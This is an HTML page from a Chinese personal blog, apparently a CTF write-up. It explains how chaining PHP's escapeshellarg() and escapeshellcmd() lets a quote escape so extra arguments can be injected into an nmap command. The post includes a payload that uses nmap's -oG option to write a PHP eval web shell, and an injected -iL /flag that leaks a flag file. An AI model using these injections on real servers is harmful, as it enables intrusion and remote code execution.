@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>PHP escapeshellarg()+escapeshellcmd() 之殇 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="
+escapeshellarg()：
+先将字符串用单引号括起来，然后再对单引号进行转义，转义完后会将转义后的单引号两侧再加个单引号。
+1.' &lt;?php eval($_POST[1]);?&gt; -oG 1.php '  字符串
+2..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">PHP escapeshellarg()+escapeshellcmd() 之殇</h2>
+            <div class="post-date">2022-11-26</div>
+            
+            <div class="post-content" v-pre>
+              <p><img src="https://dydydy123.github.io/post-images/1669450121853.png" alt="" loading="lazy"><br>
+<strong>escapeshellarg()：</strong><br>
+先将字符串用单引号括起来，然后再对单引号进行转义，转义完后会将转义后的单引号两侧再加个单引号。<br>
+1.<code>' &lt;?php eval($_POST[1]);?&gt; -oG 1.php '</code>  字符串<br>
+2.<code>'' &lt;?php eval($_POST[1]);?&gt; -oG 1.php ''</code>  两侧加上单引号，用单引号将字符串括起来。<br>
+3.<code>'\' &lt;?php eval($_POST[1]);?&gt; -oG 1.php \''</code>  对单引号括起来的字符串中的单引号进行转义。<br>
+4.<code>''\'' &lt;?php eval($_POST[1]);?&gt; -oG 1.php '\'''</code>  在转义后的 <code>\'</code> 两侧各加上一个 <code>'</code> ,<code>'\''</code><br>
+<img src="https://dydydy123.github.io/post-images/1669450134247.png" alt="" loading="lazy"><br>
+<strong>escapeshellcmd()：</strong><br>
+对一些特殊字符和未配对的单引号进行转义。<br>
+处理后为:<br>
+<code>''\\'' \&lt;\?php eval($_POST[1])\;\?\&gt; -oG 1.php '\\'''</code><br>
+等价于：<br>
+<code>\ \&lt;\?php eval($_POST[1])\;\?\&gt; -oG 1.php \</code></p>
+<p><strong>其他：</strong><br>
+-iL 读取文件内容，以文件内容作为搜索目标<br>
+-o 输出到文件<br>
+举例</p>
+<p><code>nmap -iL ip_target.txt -o result.txt</code></p>
+<pre><code># Nmap 6.47 scan initiated Fri Dec  2 14:18:19 2022 as: nmap -Pn -T4 -F --host-timeout 1000ms -oX xml/55bbd -iL /flag -o result.txt \ \\
+Failed to resolve &quot;flag{29f78a58-5881-42aa-b107-255a498eca96}&quot;.
+WARNING: No targets were specified, so 0 hosts scanned.
+# Nmap done at Fri Dec  2 14:18:19 2022 -- 0 IP addresses (0 hosts up) scanned in 0.07 seconds
+</code></pre>
+<p>保存文件：<br>
+<img src="https://dydydy123.github.io/post-images/1669991105558.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
